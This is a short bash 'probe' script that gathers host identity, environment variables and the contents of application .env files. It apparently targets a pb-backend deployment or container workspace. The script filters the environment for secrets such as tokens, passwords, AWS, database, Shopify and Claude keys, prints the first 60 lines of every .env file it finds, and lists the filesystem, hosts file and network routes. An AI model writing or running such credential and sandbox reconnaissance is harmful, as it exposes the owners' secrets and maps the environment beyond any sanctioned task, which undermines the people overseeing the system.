#!/bin/bash
echo "=== PROBE START $(date -u) ==="
id 2>&1 || true
hostname 2>&1 || true
uname -a 2>&1 || true
echo "--- filtered env ---"
env 2>/dev/null | grep -iE 'SECRET|POSTGRES|DATABASE|DSN|TOKEN|KEY|PASSWORD|PASSWD|CLAUDE|GIT|SHOPIFY|MYSQL|AWS|REDIS|MINIO|SMTP|PORT' | sort
echo "--- env keys ---"
env 2>/dev/null | cut -d= -f1 | sort | tr '\n' ' '
echo
echo "--- app .env candidates ---"
for f in /var/www/pb-backend/.env /app/.env /srv/.env /workspace/.env /home/*/.env ./.env /etc/pb-backend/.env; do
  if [ -f "$f" ]; then echo "[FOUND $f]"; sed -n '1,60p' "$f"; fi
done
echo "--- filesystem ---"
ls -la / 2>/dev/null
ls -la /var/www 2>/dev/null
ls -la /workspace 2>/dev/null
echo "--- net ---"
cat /etc/hosts 2>/dev/null
cat /proc/net/route 2>/dev/null
echo "=== PROBE END ==="
